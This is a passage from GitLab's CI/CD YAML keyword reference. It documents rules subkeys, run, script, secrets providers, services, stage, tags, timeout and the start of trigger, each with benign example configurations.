because `rules` evaluation happens before jobs run and artifacts are fetched.
- To test the existence of a directory, the path must end with a forward slash (/)

##### `rules:exists:paths` [Permalink](https://docs.gitlab.com/ci/yaml/\#rulesexistspaths "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/386040) in GitLab 16.11 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_support_rules_exists_paths_and_project`. Disabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/386040) in GitLab 17.0. Feature flag `ci_support_rules_exists_paths_and_project` removed.

`rules:exists:paths` is the same as using [`rules:exists`](https://docs.gitlab.com/ci/yaml/#rulesexists) without
any subkeys. All additional details are the same.

**Keyword type**: Job keyword. You can use it as part of a job or an [`include`](https://docs.gitlab.com/ci/yaml/#include).

**Supported values**:

- An array of file paths.

**Example of `rules:exists:paths`**:

YAML Copy to clipboard

```yaml
docker-build-1:
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      exists:
        - Dockerfile

docker-build-2:
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      exists:
        paths:
          - Dockerfile
```

In this example, both jobs have the same behavior.

**Additional details**:

- In some cases you cannot use `/` or `./` in a CI/CD variable with `exists`.
See [issue 386595](https://gitlab.com/gitlab-org/gitlab/-/issues/386595) for more details.

##### `rules:exists:project` [Permalink](https://docs.gitlab.com/ci/yaml/\#rulesexistsproject "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/386040) in GitLab 16.11 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_support_rules_exists_paths_and_project`. Disabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/386040) in GitLab 17.0. Feature flag `ci_support_rules_exists_paths_and_project` removed.

Use `rules:exists:project` to specify the location in which to search for the files
listed under [`rules:exists:paths`](https://docs.gitlab.com/ci/yaml/#rulesexistspaths). Must be used with `rules:exists:paths`.

**Keyword type**: Job keyword. You can use it as part of a job or an [`include`](https://docs.gitlab.com/ci/yaml/#include), and it must be combined with `rules:exists:paths`.

**Supported values**:

- `exists:project`: A full project path, including namespace and group.
- `exists:ref`: Optional. The commit ref to use to search for the file. The ref can be a tag, branch name, or SHA. Defaults to the `HEAD` of the project when not specified.

**Example of `rules:exists:project`**:

YAML Copy to clipboard

```yaml
docker build:
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - exists:
        paths:
          - Dockerfile
        project: my-group/my-project
        ref: v1.0.0
```

In this example, the `docker build` job is only included when the `Dockerfile` exists in
the project `my-group/my-project` on the commit tagged with `v1.0.0`.

#### `rules:when` [Permalink](https://docs.gitlab.com/ci/yaml/\#ruleswhen "Permalink")

Use `rules:when` alone or as part of another rule to control conditions for adding
a job to a pipeline. `rules:when` is similar to [`when`](https://docs.gitlab.com/ci/yaml/#when), but with slightly
different input options.

If a `rules:when` rule is not combined with `if`, `changes`, or `exists`, it always matches
if reached when evaluating a job’s rules.

**Keyword type**: Job-specific. You can use it only as part of a job.

**Supported values**:

- `on_success` (default): Run the job only when no jobs in earlier stages fail.
- `on_failure`: Run the job only when at least one job in an earlier stage fails.
- `never`: Don’t run the job regardless of the status of jobs in earlier stages.
- `always`: Run the job regardless of the status of jobs in earlier stages.
- `manual`: Add the job to the pipeline as a [manual job](https://docs.gitlab.com/ci/jobs/job_control/#create-a-job-that-must-be-run-manually).
The default value for [`allow_failure`](https://docs.gitlab.com/ci/yaml/#allow_failure) changes to `false`.
- `delayed`: Add the job to the pipeline as a [delayed job](https://docs.gitlab.com/ci/jobs/job_control/#run-a-job-after-a-delay).

**Example of `rules:when`**:

YAML Copy to clipboard

```yaml
job1:
rules:
    - if: $CI_COMMIT_REF_NAME == $CI_DEFAULT_BRANCH
    - if: $CI_COMMIT_REF_NAME =~ /feature/
      when: delayed
    - when: manual
script:
    - echo
```

In this example, `job1` is added to pipelines:

- For the default branch, with `when: on_success` which is the default behavior
when `when` is not defined.
- For feature branches as a delayed job.
- In all other cases as a manual job.

**Additional details**:

- When evaluating the status of jobs for `on_success` and `on_failure`:
  - Jobs with [`allow_failure: true`](https://docs.gitlab.com/ci/yaml/#allow_failure) in earlier stages are considered successful, even if they failed.
  - Skipped jobs in earlier stages, for example [manual jobs that have not been started](https://docs.gitlab.com/ci/jobs/job_control/#create-a-job-that-must-be-run-manually),
    are considered successful.
- When using `rules:when: manual` to [add a manual job](https://docs.gitlab.com/ci/jobs/job_control/#create-a-job-that-must-be-run-manually):
  - [`allow_failure`](https://docs.gitlab.com/ci/yaml/#allow_failure) becomes `false` by default. This default is the opposite of
    using [`when: manual`](https://docs.gitlab.com/ci/yaml/#when) to add a manual job.
  - To achieve the same behavior as `when: manual` defined outside of `rules`, set [`rules: allow_failure`](https://docs.gitlab.com/ci/yaml/#rulesallow_failure) to `true`.

#### `rules:allow_failure` [Permalink](https://docs.gitlab.com/ci/yaml/\#rulesallow_failure "Permalink")

Use [`allow_failure: true`](https://docs.gitlab.com/ci/yaml/#allow_failure) in `rules` to allow a job to fail
without stopping the pipeline.

You can also use `allow_failure: true` with a manual job. The pipeline continues
running without waiting for the result of the manual job. `allow_failure: false`
combined with `when: manual` in rules causes the pipeline to wait for the manual
job to run before continuing.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `true` or `false`. Defaults to `false` if not defined.

**Example of `rules:allow_failure`**:

YAML Copy to clipboard

```yaml
job:
script: echo "Hello, Rules!"
rules:
    - if: $CI_MERGE_REQUEST_TARGET_BRANCH_NAME == $CI_DEFAULT_BRANCH
      when: manual
      allow_failure: true
```

If the rule matches, then the job is a manual job with `allow_failure: true`.

**Additional details**:

- The rule-level `rules:allow_failure` overrides the job-level [`allow_failure`](https://docs.gitlab.com/ci/yaml/#allow_failure),
and only applies when the specific rule triggers the job.

#### `rules:needs` [Permalink](https://docs.gitlab.com/ci/yaml/\#rulesneeds "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/31581) in GitLab 16.0 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `introduce_rules_with_needs`. Disabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/408871) in GitLab 16.2. Feature flag `introduce_rules_with_needs` removed.

Use `needs` in rules to update a job’s [`needs`](https://docs.gitlab.com/ci/yaml/#needs) for specific conditions. When a condition matches a rule, the job’s `needs` configuration is completely replaced with the `needs` in the rule.

**Keyword type**: Job-specific. You can use it only as part of a job.

**Supported values**:

- An array of job names as strings.
- A hash with a job name, optionally with additional attributes.
- An empty array ( `[]`), to set the job needs to none when the specific condition is met.

**Example of `rules:needs`**:

YAML Copy to clipboard

```yaml
build-dev:
stage: build
rules:
    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
script: echo "Feature branch, so building dev version..."

build-prod:
stage: build
rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
script: echo "Default branch, so building prod version..."

tests:
stage: test
rules:
    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
      needs: ['build-dev']
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      needs: ['build-prod']
script: echo "Running dev specs by default, or prod specs when default branch..."
```

In this example:

- If the pipeline runs on a branch that is not the default branch, and therefore the rule matches the first condition, the `specs` job needs the `build-dev` job.
- If the pipeline runs on the default branch, and therefore the rule matches the second condition, the `specs` job needs the `build-prod` job.

**Additional details**:

- `needs` in rules override any `needs` defined at the job-level. When overridden, the behavior is same as [job-level `needs`](https://docs.gitlab.com/ci/yaml/#needs).
- `needs` in rules can accept [`artifacts`](https://docs.gitlab.com/ci/yaml/#needsartifacts) and [`optional`](https://docs.gitlab.com/ci/yaml/#needsoptional).

#### `rules:variables` [Permalink](https://docs.gitlab.com/ci/yaml/\#rulesvariables "Permalink")

Use [`variables`](https://docs.gitlab.com/ci/yaml/#variables) in `rules` to define variables for specific conditions.

**Keyword type**: Job-specific. You can use it only as part of a job.

**Supported values**:

- A hash of variables in the format `VARIABLE-NAME: value`.

**Example of `rules:variables`**:

YAML Copy to clipboard

```yaml
job:
variables:
    DEPLOY_VARIABLE: "default-deploy"
rules:
    - if: $CI_COMMIT_REF_NAME == $CI_DEFAULT_BRANCH
      variables:                              # Override DEPLOY_VARIABLE defined
        DEPLOY_VARIABLE: "deploy-production"  # at the job level.
    - if: $CI_COMMIT_REF_NAME =~ /feature/
      variables:
        IS_A_FEATURE: "true"                  # Define a new variable.
script:
    - echo "Run script with $DEPLOY_VARIABLE as an argument"
    - echo "Run another script if $IS_A_FEATURE exists"
```

#### `rules:interruptible` [Permalink](https://docs.gitlab.com/ci/yaml/\#rulesinterruptible "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/194023) in GitLab 16.10.

Use `interruptible` in rules to update a job’s [`interruptible`](https://docs.gitlab.com/ci/yaml/#interruptible) value for specific conditions.

**Keyword type**: Job-specific. You can use it only as part of a job.

**Supported values**:

- `true` or `false`.

**Example of `rules:interruptible`**:

YAML Copy to clipboard

```yaml
job:
script: echo "Hello, Rules!"
interruptible: true
rules:
    - if: $CI_COMMIT_REF_NAME == $CI_DEFAULT_BRANCH
      interruptible: false  # Override interruptible defined at the job level.
    - when: on_success
```

**Additional details**:

- The rule-level `rules:interruptible` overrides the job-level [`interruptible`](https://docs.gitlab.com/ci/yaml/#interruptible),
and only applies when the specific rule triggers the job.

### `run` [Permalink](https://docs.gitlab.com/ci/yaml/\#run "Permalink")

- Status: Experiment

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/440487) in GitLab 17.3 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `pipeline_run_keyword`. Disabled by default. Requires GitLab Runner 17.1.
- Feature flag `pipeline_run_keyword` [removed](https://gitlab.com/gitlab-org/gitlab/-/issues/471925) in GitLab 17.5.

This feature is available for testing, but not ready for production use.

Use `run` to define a series of [steps](https://docs.gitlab.com/ci/steps/) to be executed in a job. Each step can be either a script or a predefined step.

You can also provide optional environment variables and inputs.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- An array of hashes, where each hash represents a step with the following possible keys:
  - `name`: A string representing the name of the step.
  - `script`: A string or array of strings containing shell commands to execute.
  - `step`: A string identifying a predefined step to run.
  - `env`: Optional. A hash of environment variables specific to this step.
  - `inputs`: Optional. A hash of input parameters for predefined steps.

Each array entry must have a `name`, and one `script` or `step` (but not both).

**Example of `run`**:

YAML Copy to clipboard

```yaml
job:
run:
    - name: 'hello_steps'
      script: 'echo "hello from step1"'
    - name: 'bye_steps'
      step: gitlab.com/gitlab-org/ci-cd/runner-tools/echo-step@main
      inputs:
        echo: 'bye steps!'
      env:
        var1: 'value 1'
```

In this example, the job has two steps:

- `hello_steps` runs the `echo` shell command.
- `bye_steps` uses a predefined step with an environment variable and an input parameter.

**Additional details**:

- A step can have either a `script` or a `step` key, but not both.
- A `run` configuration cannot be used together with existing [`script`](https://docs.gitlab.com/ci/yaml/#script), [`after_script`](https://docs.gitlab.com/ci/yaml/#after_script) or [`before_script`](https://docs.gitlab.com/ci/yaml/#before_script) keywords.
- Multi-line scripts can be defined using [YAML block scalar syntax](https://docs.gitlab.com/ci/yaml/script/#split-long-commands).

### `script` [Permalink](https://docs.gitlab.com/ci/yaml/\#script "Permalink")

Use `script` to specify commands for the runner to execute.

All jobs except [trigger jobs](https://docs.gitlab.com/ci/yaml/#trigger) require a `script` keyword.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: An array including:

- Single line commands.
- Long commands [split over multiple lines](https://docs.gitlab.com/ci/yaml/script/#split-long-commands).
- [YAML anchors](https://docs.gitlab.com/ci/yaml/yaml_optimization/#yaml-anchors-for-scripts).

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `script`**:

YAML Copy to clipboard

```yaml
job1:
script: "bundle exec rspec"

job2:
script:
    - uname -a
    - bundle exec rspec
```

**Additional details**:

- When you use [these special characters in `script`](https://docs.gitlab.com/ci/yaml/script/#use-special-characters-with-script), you must use single quotes ( `'`) or double quotes ( `"`).

**Related topics**:

- You can [ignore non-zero exit codes](https://docs.gitlab.com/ci/yaml/script/#ignore-non-zero-exit-codes).
- [Use color codes with `script`](https://docs.gitlab.com/ci/yaml/script/#add-color-codes-to-script-output)
to make job logs easier to review.
- [Create custom collapsible sections](https://docs.gitlab.com/ci/jobs/job_logs/#custom-collapsible-sections)
to simplify job log output.

### `secrets` [Permalink](https://docs.gitlab.com/ci/yaml/\#secrets "Permalink")

- Tier: Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

Use `secrets` to specify [CI/CD secrets](https://docs.gitlab.com/ci/secrets/) to:

- Retrieve from an external secrets provider.
- Make available in the job as [CI/CD variables](https://docs.gitlab.com/ci/variables/)
( [`file` type](https://docs.gitlab.com/ci/variables/#use-file-type-cicd-variables) by default).

#### `secrets:vault` [Permalink](https://docs.gitlab.com/ci/yaml/\#secretsvault "Permalink")

History

- `generic` engine option [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/366492) in GitLab Runner 16.11.

Use `secrets:vault` to specify secrets provided by a [HashiCorp Vault](https://www.vaultproject.io/).

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `engine:name`: Name of the secrets engine. Can be one of `kv-v2` (default), `kv-v1`, or `generic`.
- `engine:path`: Path to the secrets engine.
- `path`: Path to the secret.
- `field`: Name of the field where the password is stored.

**Example of `secrets:vault`**:

To specify all details explicitly and use the [KV-V2](https://developer.hashicorp.com/vault/docs/secrets/kv/kv-v2) secrets engine:

YAML Copy to clipboard

```yaml
job:
secrets:
    DATABASE_PASSWORD:  # Store the path to the secret in this CI/CD variable
      vault:  # Translates to secret: `ops/data/production/db`, field: `password`
        engine:
          name: kv-v2
          path: ops
        path: production/db
        field: password
```

You can shorten this syntax. With the short syntax, `engine:name` and `engine:path`
both default to `kv-v2`:

YAML Copy to clipboard

```yaml
job:
secrets:
    DATABASE_PASSWORD:  # Store the path to the secret in this CI/CD variable
      vault: production/db/password  # Translates to secret: `kv-v2/data/production/db`, field: `password`
```

To specify a custom secrets engine path in the short syntax, add a suffix that starts with `@`:

YAML Copy to clipboard

```yaml
job:
secrets:
    DATABASE_PASSWORD:  # Store the path to the secret in this CI/CD variable
      vault: production/db/password@ops  # Translates to secret: `ops/data/production/db`, field: `password`
```

#### `secrets:gcp_secret_manager` [Permalink](https://docs.gitlab.com/ci/yaml/\#secretsgcp_secret_manager "Permalink")

History

- [Introduced](https://gitlab.com/groups/gitlab-org/-/epics/11739) in GitLab 16.8 and GitLab Runner 16.8.

Use `secrets:gcp_secret_manager` to specify secrets provided by [GCP Secret Manager](https://cloud.google.com/security/products/secret-manager).

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `name`: Name of the secret.
- `version`: Version of the secret.

**Example of `secrets:gcp_secret_manager`**:

YAML Copy to clipboard

```yaml
job:
secrets:
    DATABASE_PASSWORD:
      gcp_secret_manager:
        name: 'test'
        version: 2
```

**Related topics**:

- [Use GCP Secret Manager secrets in GitLab CI/CD](https://docs.gitlab.com/ci/secrets/gcp_secret_manager/).

#### `secrets:azure_key_vault` [Permalink](https://docs.gitlab.com/ci/yaml/\#secretsazure_key_vault "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/271271) in GitLab 16.3 and GitLab Runner 16.3.

Use `secrets:azure_key_vault` to specify secrets provided by a [Azure Key Vault](https://azure.microsoft.com/en-us/products/key-vault/).

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `name`: Name of the secret.
- `version`: Version of the secret.

**Example of `secrets:azure_key_vault`**:

YAML Copy to clipboard

```yaml
job:
secrets:
    DATABASE_PASSWORD:
      azure_key_vault:
        name: 'test'
        version: 'test'
```

**Related topics**:

- [Use Azure Key Vault secrets in GitLab CI/CD](https://docs.gitlab.com/ci/secrets/azure_key_vault/).

#### `secrets:file` [Permalink](https://docs.gitlab.com/ci/yaml/\#secretsfile "Permalink")

Use `secrets:file` to configure the secret to be stored as either a
[`file` or `variable` type CI/CD variable](https://docs.gitlab.com/ci/variables/#use-file-type-cicd-variables)

By default, the secret is passed to the job as a `file` type CI/CD variable. The value
of the secret is stored in the file and the variable contains the path to the file.

If your software can’t use `file` type CI/CD variables, set `file: false` to store
the secret value directly in the variable.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `true` (default) or `false`.

**Example of `secrets:file`**:

YAML Copy to clipboard

```yaml
job:
secrets:
    DATABASE_PASSWORD:
      vault: production/db/password@ops
      file: false
```

**Additional details**:

- The `file` keyword is a setting for the CI/CD variable and must be nested under
the CI/CD variable name, not in the `vault` section.

#### `secrets:token` [Permalink](https://docs.gitlab.com/ci/yaml/\#secretstoken "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/356986) in GitLab 15.8, controlled by the **Limit JSON Web Token (JWT) access** setting.
- [Made always available and **Limit JSON Web Token (JWT) access** setting removed](https://gitlab.com/gitlab-org/gitlab/-/issues/366798) in GitLab 16.0.

Use `secrets:token` to explicitly select a token to use when authenticating with the external secrets provider by referencing the token’s CI/CD variable.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- The name of an ID token

**Example of `secrets:token`**:

YAML Copy to clipboard

```yaml
job:
id_tokens:
    AWS_TOKEN:
      aud: https://aws.example.com
    VAULT_TOKEN:
      aud: https://vault.example.com
secrets:
    DB_PASSWORD:
      vault: gitlab/production/db
      token: $VAULT_TOKEN
```

**Additional details**:

- When the `token` keyword is not set and there is only one token defined, the defined token will automatically be used.
- If there is more than one token defined, you should specify which token to use by setting the `token` keyword.
If you do not specify which token to use, it is not possible to predict which token is used each time the job runs.

### `services` [Permalink](https://docs.gitlab.com/ci/yaml/\#services "Permalink")

Use `services` to specify any additional Docker images that your scripts require to run successfully. The [`services` image](https://docs.gitlab.com/ci/services/) is linked
to the image specified in the [`image`](https://docs.gitlab.com/ci/yaml/#image) keyword.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**: The name of the services image, including the registry path if needed, in one of these formats:

- `<image-name>` (Same as using `<image-name>` with the `latest` tag)
- `<image-name>:<tag>`
- `<image-name>@<digest>`

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file), but [not for `alias`](https://gitlab.com/gitlab-org/gitlab/-/issues/19561).

**Example of `services`**:

YAML Copy to clipboard

```yaml
default:
image:
    name: ruby:2.6
    entrypoint: ["/bin/bash"]

services:
    - name: my-postgres:11.7
      alias: db-postgres
      entrypoint: ["/usr/local/bin/db-postgres"]
      command: ["start"]

before_script:
    - bundle install

test:
script:
    - bundle exec rake spec
```

In this example, GitLab launches two containers for the job:

- A Ruby container that runs the `script` commands.
- A PostgreSQL container. The `script` commands in the Ruby container can connect to
the PostgreSQL database at the `db-postgres` hostname.

**Related topics**:

- [Available settings for `services`](https://docs.gitlab.com/ci/services/#available-settings-for-services).
- [Define `services` in the `.gitlab-ci.yml` file](https://docs.gitlab.com/ci/services/#define-services-in-the-gitlab-ciyml-file).
- [Run your CI/CD jobs in Docker containers](https://docs.gitlab.com/ci/docker/using_docker_images/).
- [Use Docker to build Docker images](https://docs.gitlab.com/ci/docker/using_docker_build/).

#### `services:docker` [Permalink](https://docs.gitlab.com/ci/yaml/\#servicesdocker "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/27919) in GitLab 16.7. Requires GitLab Runner 16.7 or later.
- `user` input option [introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/137907) in GitLab 16.8.

Use `services:docker` to pass options to the Docker executor of a GitLab Runner.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

A hash of options for the Docker executor, which can include:

- `platform`: Selects the architecture of the image to pull. When not specified,
the default is the same platform as the host runner.
- `user`: Specify the username or UID to use when running the container.

**Example of `services:docker`**:

YAML Copy to clipboard

```yaml
arm-sql-job:
script: echo "Run sql tests in service container"
image: ruby:2.6
services:
    - name: super/sql:experimental
      docker:
        platform: arm64/v8
        user: dave
```

**Additional details**:

- `services:docker:platform` maps to the [`docker pull --platform` option](https://docs.docker.com/reference/cli/docker/image/pull/#options).
- `services:docker:user` maps to the [`docker run --user` option](https://docs.docker.com/reference/cli/docker/container/run/#options).

#### `services:kubernetes` [Permalink](https://docs.gitlab.com/ci/yaml/\#serviceskubernetes "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/38451) in GitLab 18.0. Requires GitLab Runner 17.11 or later.
- `user` input option [introduced](https://gitlab.com/gitlab-org/gitlab-runner/-/merge_requests/5469) in GitLab Runner 17.11.
- `user` input option [extended to support `uid:gid` format](https://gitlab.com/gitlab-org/gitlab-runner/-/merge_requests/5540) in GitLab 18.0.

Use `services:kubernetes` to pass options to the GitLab Runner [Kubernetes executor](https://docs.gitlab.com/runner/executors/kubernetes/).

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

A hash of options for the Kubernetes executor, which can include:

- `user`: Specify the username or UID to use when the container runs. You can also use it to set GID by using the `UID:GID` format.

**Example of `services:kubernetes` with only UID**:

YAML Copy to clipboard

```yaml
arm-sql-job:
script: echo "Run sql tests"
image: ruby:2.6
services:
    - name: super/sql:experimental
      kubernetes:
        user: "1001"
```

**Example of `services:kubernetes` with both UID and GID**:

YAML Copy to clipboard

```yaml
arm-sql-job:
script: echo "Run sql tests"
image: ruby:2.6
services:
    - name: super/sql:experimental
      kubernetes:
        user: "1001:1001"
```

#### `services:pull_policy` [Permalink](https://docs.gitlab.com/ci/yaml/\#servicespull_policy "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/21619) in GitLab 15.1 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_docker_image_pull_policy`. Disabled by default.
- [Enabled on GitLab.com and GitLab Self-Managed](https://gitlab.com/gitlab-org/gitlab/-/issues/363186) in GitLab 15.2.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/363186) in GitLab 15.4. [Feature flag `ci_docker_image_pull_policy`](https://gitlab.com/gitlab-org/gitlab/-/issues/363186) removed.

The pull policy that the runner uses to fetch the Docker image. Requires GitLab Runner 15.1 or later.

**Keyword type**: Job keyword. You can use it only as part of a job or in the [`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- A single pull policy, or multiple pull policies in an array.
Can be `always`, `if-not-present`, or `never`.

**Examples of `services:pull_policy`**:

YAML Copy to clipboard

```yaml
job1:
script: echo "A single pull policy."
services:
    - name: postgres:11.6
      pull_policy: if-not-present

job2:
script: echo "Multiple pull policies."
services:
    - name: postgres:11.6
      pull_policy: [always, if-not-present]
```

**Additional details**:

- If the runner does not support the defined pull policy, the job fails with an error similar to:
`ERROR: Job failed (system failure): the configured PullPolicies ([always]) are not allowed by AllowedPullPolicies ([never])`.

**Related topics**:

- [Run your CI/CD jobs in Docker containers](https://docs.gitlab.com/ci/docker/using_docker_images/).
- [Configure how runners pull images](https://docs.gitlab.com/runner/executors/docker.html#configure-how-runners-pull-images).
- [Set multiple pull policies](https://docs.gitlab.com/runner/executors/docker.html#set-multiple-pull-policies).

### `stage` [Permalink](https://docs.gitlab.com/ci/yaml/\#stage "Permalink")

Use `stage` to define which [stage](https://docs.gitlab.com/ci/yaml/#stages) a job runs in. Jobs in the same
`stage` can execute in parallel (see **Additional details**).

If `stage` is not defined, the job uses the `test` stage by default.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: A string, which can be a:

- [Default stage](https://docs.gitlab.com/ci/yaml/#stages).
- User-defined stages.

**Example of `stage`**:

YAML Copy to clipboard

```yaml
stages:
  - build
  - test
  - deploy

job1:
stage: build
script:
    - echo "This job compiles code."

job2:
stage: test
script:
    - echo "This job tests the compiled code. It runs when the build stage completes."

job3:
script:
    - echo "This job also runs in the test stage."

job4:
stage: deploy
script:
    - echo "This job deploys the code. It runs when the test stage completes."
environment: production
```

**Additional details**:

- The stage name must be 255 characters or fewer.
- Jobs can run in parallel if they run on different runners.
- If you have only one runner, jobs can run in parallel if the runner’s
[`concurrent` setting](https://docs.gitlab.com/runner/configuration/advanced-configuration.html#the-global-section)
is greater than `1`.

#### `stage: .pre` [Permalink](https://docs.gitlab.com/ci/yaml/\#stage-pre "Permalink")

Use the `.pre` stage to make a job run at the start of a pipeline. By default, `.pre` is
the first stage in a pipeline. User-defined stages execute after `.pre`.
You do not have to define `.pre` in [`stages`](https://docs.gitlab.com/ci/yaml/#stages).

If a pipeline contains only jobs in the `.pre` or `.post` stages, it does not run.
There must be at least one other job in a different stage.

**Keyword type**: You can only use it with a job’s `stage` keyword.

**Example of `stage: .pre`**:

YAML Copy to clipboard

```yaml
stages:
  - build
  - test

job1:
stage: build
script:
    - echo "This job runs in the build stage."

first-job:
stage: .pre
script:
    - echo "This job runs in the .pre stage, before all other stages."

job2:
stage: test
script:
    - echo "This job runs in the test stage."
```

**Additional details**:

- If a pipeline has jobs with [`needs: []`](https://docs.gitlab.com/ci/yaml/#needs) and jobs in the `.pre` stage, they will
all start as soon as the pipeline is created. Jobs with `needs: []` start immediately,
ignoring any stage configuration.
- A [pipeline execution policy](https://docs.gitlab.com/user/application_security/policies/pipeline_execution_policies/) can define a `.pipeline-policy-pre` stage which runs before `.pre`.

#### `stage: .post` [Permalink](https://docs.gitlab.com/ci/yaml/\#stage-post "Permalink")

Use the `.post` stage to make a job run at the end of a pipeline. By default, `.post`
is the last stage in a pipeline. User-defined stages execute before `.post`.
You do not have to define `.post` in [`stages`](https://docs.gitlab.com/ci/yaml/#stages).

If a pipeline contains only jobs in the `.pre` or `.post` stages, it does not run.
There must be at least one other job in a different stage.

**Keyword type**: You can only use it with a job’s `stage` keyword.

**Example of `stage: .post`**:

YAML Copy to clipboard

```yaml
stages:
  - build
  - test

job1:
stage: build
script:
    - echo "This job runs in the build stage."

last-job:
stage: .post
script:
    - echo "This job runs in the .post stage, after all other stages."

job2:
stage: test
script:
    - echo "This job runs in the test stage."
```

**Additional details**:

- A [pipeline execution policy](https://docs.gitlab.com/user/application_security/policies/pipeline_execution_policies/) can define a `.pipeline-policy-post` stage which runs after `.post`.

### `tags` [Permalink](https://docs.gitlab.com/ci/yaml/\#tags "Permalink")

Use `tags` to select a specific runner from the list of all runners that are
available for the project.

When you register a runner, you can specify the runner’s tags, for
example `ruby`, `postgres`, or `development`. To pick up and run a job, a runner must
be assigned every tag listed in the job.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- An array of tag names, which are case-sensitive.
- CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `tags`**:

YAML Copy to clipboard

```yaml
job:
tags:
    - ruby
    - postgres
```

In this example, only runners with both the `ruby` and `postgres` tags can run the job.

**Additional details**:

- The number of tags must be less than `50`.

**Related topics**:

- [Use tags to control which jobs a runner can run](https://docs.gitlab.com/ci/runners/configure_runners/#control-jobs-that-a-runner-can-run)
- [Select different runner tags for each parallel matrix job](https://docs.gitlab.com/ci/jobs/job_control/#select-different-runner-tags-for-each-parallel-matrix-job)
- Runner tags for hosted runners:
  - [Hosted runners on Linux](https://docs.gitlab.com/ci/runners/hosted_runners/linux/)
  - [GPU-enabled hosted runners](https://docs.gitlab.com/ci/runners/hosted_runners/gpu_enabled/)
  - [Hosted runners on macOS](https://docs.gitlab.com/ci/runners/hosted_runners/macos/)
  - [Hosted runners on Windows](https://docs.gitlab.com/ci/runners/hosted_runners/windows/)

### `timeout` [Permalink](https://docs.gitlab.com/ci/yaml/\#timeout "Permalink")

Use `timeout` to configure a timeout for a specific job. If the job runs for longer
than the timeout, the job fails.

The job-level timeout can be longer than the [project-level timeout](https://docs.gitlab.com/ci/pipelines/settings/#set-a-limit-for-how-long-jobs-can-run),
but can’t be longer than the [runner’s timeout](https://docs.gitlab.com/ci/runners/configure_runners/#set-the-maximum-job-timeout).

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**: A period of time written in natural language. For example, these are all equivalent:

- `3600 seconds`
- `60 minutes`
- `one hour`

**Example of `timeout`**:

YAML Copy to clipboard

```yaml
build:
script: build.sh
timeout: 3 hours 30 minutes

test:
script: rspec
timeout: 3h 30m
```

### `trigger` [Permalink](https://docs.gitlab.com/ci/yaml/\#trigger "Permalink")

History

- Support for `environment` [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/369061) in GitLab 16.4.

Use `trigger` to declare that a job is a “trigger job” which starts a
[downstream pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/) that is either:

- [A multi-project pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#multi-project-pipelines).
- [A child pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines).

Trigger jobs can use only a limited set of GitLab CI/CD configuration keywords.
The keywords available for use in trigger jobs are:

- [`allow_failure`](https://docs.gitlab.com/ci/yaml/#allow_failure).
- [`extends`](https://docs.gitlab.com/ci/yaml/#extends).
